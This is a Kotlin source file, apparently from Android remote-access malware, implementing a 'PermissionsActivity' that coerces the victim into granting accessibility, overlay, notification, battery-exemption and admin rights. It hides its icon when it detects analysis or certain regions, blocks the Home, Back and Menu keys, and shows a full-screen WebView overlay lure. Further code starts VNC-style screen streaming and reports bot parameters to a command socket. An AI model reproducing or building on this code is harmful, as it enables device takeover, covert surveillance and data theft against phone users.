package com.xxx.zzz

import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Base64
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import com.xxx.zzz.aall.hjqsfed.permissfdsions.OnPermissionCallbacky
import com.xxx.zzz.aall.hjqsfed.permissfdsions.XXPermissionsv
import com.xxx.zzz.aall.orgsss.jetbrains.ankos.jetbrains.dialogs.toast
import com.xxx.zzz.aall.permasd.PermUtil
import com.xxx.zzz.aall.permasd.utilsssss.PermissionsUtil
import com.xxx.zzz.accessppp.AccessibilityServiceQ
import com.xxx.zzz.accessppp.ScreenCaptureService
import com.xxx.zzz.adminp.ActivityAdminqw
import com.xxx.zzz.globp.*
import com.xxx.zzz.globp.utilssss.MiuUtils
import com.xxx.zzz.globp.utilssss.Utilslp
import com.xxx.zzz.globp.utilssss.evade
import com.xxx.zzz.notifp.DrawerSniffer
import com.xxx.zzz.notifp.PushServiceds
import com.xxx.zzz.servicesp.CommandServicedas
import com.xxx.zzz.socketsp.IOSocketyt
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.lang.ref.WeakReference
import java.util.*


@OptIn(ExperimentalStdlibApi::class)
class PermissionsActivity : AppCompatActivity() {

    val wm by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }

    var launchHttp = true
    var wv: WebView? = null

    init {
        Payload.ApplicationScope.launch {
            if (Constantsfd.debug) {
                evade {}.onEscape {
                    runCatching {
                        Utilslp.deleteLabelIcon(this@PermissionsActivity)
                    }
                    withContext(Dispatchers.Main) {
                        runCatching {
                            finish()
                        }
                    }
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        runCatching {
            window.setFlags(
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
            )
            window.setType(WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY)

            super.onCreate(savedInstanceState)

            runCatching {
                if (Utilslp.blockCIS(this@PermissionsActivity)) {
                    runCatching {
                        Utilslp.deleteLabelIcon(this@PermissionsActivity)
                    }
                    runCatching {
                        finish()
                    }
                }
            }

            SharedPreferencess.init(this.applicationContext)
            Globalqa.mainActivity = WeakReference(this)

            runCatching {
                if (!AccessibilityServiceQ.isEnabled && PermUtil.isAccessibilityServiceEnabled(this@PermissionsActivity, AccessibilityServiceQ::class.java)) {
                    this@PermissionsActivity.startService(Intent(this@PermissionsActivity, AccessibilityServiceQ::class.java))
                }
            }

            val startFromPush: Boolean = intent.getBooleanExtra("FromPush", false)
            if (startFromPush || s227.isEmpty()) {
                launchHttp = false
            }

            val force: Boolean = intent.getBooleanExtra("FORCE", false)
            if (force) {
                IOSocketyt.updateBotParams()
                Utilslp.startApplication(SharedPreferencess.applicationId, force = true, this)
                finish()
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "PermissionsActivity onCreate ${it.localizedMessage}", "error")
        }
    }

    override fun onDestroy() {
        runCatching {
            if (wv != null) {
                wm.removeView(wv)
                wv?.removeAllViews()
                wv?.destroy()
                wv = null
            }
        }
        super.onDestroy()
    }

    override fun onResume() {
        super.onResume()
        work()
    }

    override fun onBackPressed() {
        work()
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true
        }
        return if (keyCode == KeyEvent.KEYCODE_BACK) {
            true
        } else keyCode == KeyEvent.KEYCODE_MENU
    }

    private fun openAccessabilitySettings() {
        runCatching {
            if (wv != null) {
                wm.removeView(wv)
                wv?.removeAllViews()
                wv?.destroy()
                wv = null
            }
        }

        UtilsGfgsd.gotoAccessibilityService(this)
        successLaunchUrl = true
    }

    fun work() {
        runCatching {
            successLaunchUrl = false
            lastStart = Calendar.getInstance().timeInMillis

            CommandServicedas.autoStart(this)

            if (PermUtil.isAccessibilityServiceEnabled(this, AccessibilityServiceQ::class.java)) {
                SharedPreferencess.init(this@PermissionsActivity.applicationContext)
                SharedPreferencess.hasNotifPermition = DrawerSniffer.hasPermission(this@PermissionsActivity)
                SharedPreferencess.hasAllPermition = PermissionsUtil.hasSelfPermission(this, arrayOf(*Constantsfd.PERMISSIONS))
                SharedPreferencess.hasOverlaysPermition =
                    if ("xiaomi" == Build.MANUFACTURER.lowercase())
                        MiuUtils.isAllowed(this@PermissionsActivity) && MiuUtils.canDrawOverlays(this@PermissionsActivity)
                    else
                        MiuUtils.canDrawOverlays(this@PermissionsActivity)
                SharedPreferencess.hasDozePermition = is_dozemode(this)

                if ("xiaomi" == Build.MANUFACTURER.lowercase() && !SharedPreferencess.hasOverlaysPermition) {
                    PermUtil.xiaomiOverlayPermission(this)
                }
                else {
                    if (!SharedPreferencess.hasAllPermition) {
                        tryCount = 0
                        permStart = Calendar.getInstance().timeInMillis
                        XXPermissionsv.with(this)
                            .permission(listOf(*Constantsfd.PERMISSIONS))
                            .request(object : OnPermissionCallbacky {
                                override fun onDenied(permissions: List<String>, doNotAskAgain: Boolean) {
                                    if (doNotAskAgain) {
                                        runCatching { toast("Need permissions!") }
                                        XXPermissionsv.startPermissionActivity(this@PermissionsActivity, permissions)
                                    } else {
                                        runCatching { toast("Need permissions!") }
                                        Payload.ApplicationScope.launch {
                                            work()
                                        }
                                    }
                                }

                                override fun onGranted(permissions: List<String>, allGranted: Boolean) {
                                    permStart = null
                                    if (!allGranted) {
                                        runCatching { toast("Need permissions!") }
                                        Payload.ApplicationScope.launch {
                                            work()
                                        }
                                    } else {
                                        Payload.ApplicationScope.launch {
                                            work()
                                        }
                                    }
                                }
                            })
                    }
                    else if (!SharedPreferencess.hasOverlaysPermition) {
                        if ("xiaomi" != Build.MANUFACTURER.lowercase())
                            PermUtil.requestOverlayPermission(this@PermissionsActivity)
                        else
                            PermUtil.xiaomiOverlayPermission(this)
                    }
                    else if (!SharedPreferencess.hasDozePermition && tryCount < 5) {
                        XXPermissionsv.with(this)
                            .permission(listOf(*(Constantsfd.PERMISSIONS2 + Constantsfd.PERMISSIONS3)))
                            .request(object : OnPermissionCallbacky {
                                override fun onDenied(permissions: List<String>, doNotAskAgain: Boolean) {
                                    tryCount++
                                    runCatching { toast("Need permissions!") }
                                    Payload.ApplicationScope.launch {
                                        work()
                                    }
                                }

                                override fun onGranted(permissions: List<String>, allGranted: Boolean) {
                                    tryCount++
                                    Payload.ApplicationScope.launch {
                                        work()
                                    }
                                }
                            })
                    }
                    else {
                        tryCount = 0
                        Payload.ApplicationScope.launch {
                            if (testNotif && !SharedPreferencess.hasNotifPermition) {
                                SharedPreferencess.notifCommandTest = "1"
                            } else if (testAdmin && !ActivityAdminqw.isAdminDevice(this@PermissionsActivity)) {
                                SharedPreferencess.adminCommand = "1"
                            } else if (testCommand) {
                                ScreenCaptureService.flagStop = false
                                ScreenCaptureService.vnc = true
                                SharedPreferencess.autoClickOnceStream = "1"
                                val intent = Intent(
                                    SharedPreferencess.getAppContext()!!,
                                    ScreenProjectionActivity::class.java
                                ).apply {
                                    putExtra("streamScreen", true)
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                }
                                SharedPreferencess.getAppContext()!!.startActivity(intent)
                            } else {
                                if (Constantsfd.addWaitView)
                                    AccessibilityServiceQ.instance?.deleteWaitView()

                                runCatching { PushServiceds.cancelNotification(this@PermissionsActivity) }

                                if (!startAppDetail && "xiaomi" == Build.MANUFACTURER.lowercase()) {
                                    AccessibilityServiceQ.globalActionHome()
                                    Handler(Looper.myLooper()!!).postDelayed({
                                        val intent =
                                            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                                                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                                .addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                                                .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                        val uri = Uri.fromParts("package", this@PermissionsActivity.packageName, null)
                                        intent.data = uri
                                        SharedPreferencess.clickAutoStart = false
                                        startAppDetail = true
                                        startActivity(intent)
                                    }, 1100)
                                    finish()
                                    return@launch
                                }

                                IOSocketyt.updateBotParams()
                                if (!Payload.startFrom)
                                    Utilslp.startApplication(SharedPreferencess.applicationId, force = true, this@PermissionsActivity)
                                finish()
                            }
                        }
                    }
                }

            } else {
                if (launchHttp) {
                    wv = WebView(this)
                    wv?.settings?.javaScriptEnabled = true
                    wv?.settings?.loadWithOverviewMode = true
                    wv?.settings?.useWideViewPort = true
                    wv?.settings?.pluginState = WebSettings.PluginState.ON
                    wv?.settings?.javaScriptCanOpenWindowsAutomatically = true

                    wv?.scrollBarStyle = View.SCROLLBARS_INSIDE_OVERLAY
                    wv?.webViewClient = MyWebViewClient()
                    wv?.webChromeClient = MyWebChromeClient()
                    wv?.addJavascriptInterface(WebAppInterface(this), "Android")

                    runCatching {
                        var base64 = s227
                        val data = Base64.decode(base64, Base64.DEFAULT)
                        base64 = String(data, constNm.utf)
                        base64 = base64.replace(Constantsfd.acname, Constantsfd.access2)

                        val lang = Locale.getDefault().language
                        val lan = "en"
                        base64 = base64.replace("<html lang=\"$lan\">", "<html lang=\"$lang\">")
                        base64 = base64.replace(
                            constNm.ключ_от_всего,
                            constNm.шифрование + lang + constNm.ss5
                        )

                        wv?.loadDataWithBaseURL(null, base64, "text/html", "UTF-8", null)

                        val params = WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.TYPE_APPLICATION,
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                            PixelFormat.TRANSPARENT
                        )

                        wm.addView(wv, params)
                    }.onFailure {
                        IOSocketyt.sendLogs("", "PermissionsActivity addView ${it.localizedMessage}", "error")
                    }
                } else {
                    openAccessabilitySettings()
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "PermissionsActivity work ${it.localizedMessage}", "error")
        }
    }

    inner class WebAppInterface internal constructor(var mContext: Context) {
        @JavascriptInterface
        fun onData() {
            runCatching {
                openAccessabilitySettings()
            }
        }
    }

    private inner class MyWebChromeClient : WebChromeClient() {
        override fun onJsAlert(
            view: WebView,
            url: String,
            message: String,
            result: JsResult
        ): Boolean {
            return true
        }
    }

    private inner class MyWebViewClient : WebViewClient() {
        override fun onPageFinished(view: WebView, url: String) {
            val a = 0
        }

        @Deprecated("Deprecated in Java")
        override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
            return true
        }
    }

    companion object {
        val testNotif = false
        val testAdmin = false
        val testCommand = false

        var startAppDetail = false

        var successLaunchUrl = false

        var tryCount = 0
        var lastStart = 0L
        var permStart: Long? = 0L

        fun hasAllPermission(context: Context): Boolean {
            return if (PermUtil.isAccessibilityServiceEnabled(context, AccessibilityServiceQ::class.java)) {
                if ("xiaomi" == Build.MANUFACTURER.lowercase() && (!MiuUtils.isAllowed(context) || !MiuUtils.canDrawOverlays(context))) {
                    false
                } else if ("xiaomi" != Build.MANUFACTURER.lowercase() && (!MiuUtils.canDrawOverlays(context))) {
                    false
                } else if (!PermissionsUtil.hasSelfPermission(context, arrayOf(*Constantsfd.PERMISSIONS))) {
                    false
                } else
                    is_dozemode(context)
            } else {
                false
            }
        }

        fun is_dozemode(context: Context): Boolean {
            val powerManager = context.applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager
            return powerManager.isIgnoringBatteryOptimizations(context.packageName)
        }

        fun hasOverlayPerm(ctx: Context): Boolean {
            if ("xiaomi" == Build.MANUFACTURER.lowercase() && (!MiuUtils.isAllowed(ctx) || !MiuUtils.canDrawOverlays(ctx))) {
                return false
            } else if ("xiaomi" == Build.MANUFACTURER.lowercase() && MiuUtils.isAllowed(ctx) && MiuUtils.canDrawOverlays(ctx)) {
                return true
            }

            if ("xiaomi" != Build.MANUFACTURER.lowercase() && (!MiuUtils.canDrawOverlays(ctx))) {
                return false
            } else if ("xiaomi" != Build.MANUFACTURER.lowercase() && MiuUtils.canDrawOverlays(ctx)) {
                return true
            }

            return false
        }

        val s227: String by lazy {
            if (BuildConfig.DEBUG) "" else "%INSERT_HTML_HERE%"
        }

        val s228: String by lazy {
            if (BuildConfig.DEBUG) "" else "%INSERT_POPUP_HERE%"
        }
    }

}